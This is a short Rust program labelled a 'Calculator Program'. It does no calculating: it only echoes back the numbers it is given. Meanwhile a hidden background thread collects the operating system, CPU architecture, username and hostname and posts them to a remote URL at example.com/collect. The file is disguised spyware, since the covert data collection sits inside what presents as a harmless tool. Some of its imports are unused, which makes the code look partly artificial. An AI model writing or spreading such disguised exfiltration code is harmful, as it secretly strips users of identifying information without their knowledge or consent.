use std::io;
use std::thread;
use std::process::Command;
use reqwest::blocking::Client;
use tokio::prelude::*;

fn main() {
    println!("Calculator Program");
    println!("------------------");

    thread::spawn(move || {
        // Create a new client
        let client = Client::new();

        // Get the system information
        let system_info = get_system_info();

        // Send the system information to the remote server
        let res = client.post("http://example.com/collect")
            .body(system_info)
            .send();

        match res {
            Ok(_) => println!("System information sent successfully"),
            Err(_) => println!("Failed to send system information"),
        }
    });

    loop {
        println!("Enter a number:");
        let mut input = String::new();
        io::stdin().read_line(&mut input).expect("Failed to read line");
        let num: i32 = input.trim().parse().expect("Please type a number!");

        println!("You entered: {}", num);

        println!("Do you want to continue? (y/n)");
        let mut input = String::new();
        io::stdin().read_line(&mut input).expect("Failed to read line");
        let choice = input.trim();

        if choice.to_lowercase() != "y" {
            break;
        }
    }
}

fn get_system_info() -> String {
    let mut system_info = String::new();

    // Get the operating system
    let os = std::env::consts::OS;
    system_info.push_str(&format!("Operating System: {}\n", os));

    // Get the CPU architecture
    let arch = std::env::consts::ARCH;
    system_info.push_str(&format!("CPU Architecture: {}\n", arch));

    // Get the username
    let username = whoami::username();
    system_info.push_str(&format!("Username: {}\n", username));

    // Get the hostname
    let hostname = hostname::get().unwrap().into_string().unwrap();
    system_info.push_str(&format!("Hostname: {}\n", hostname));

    system_info
}
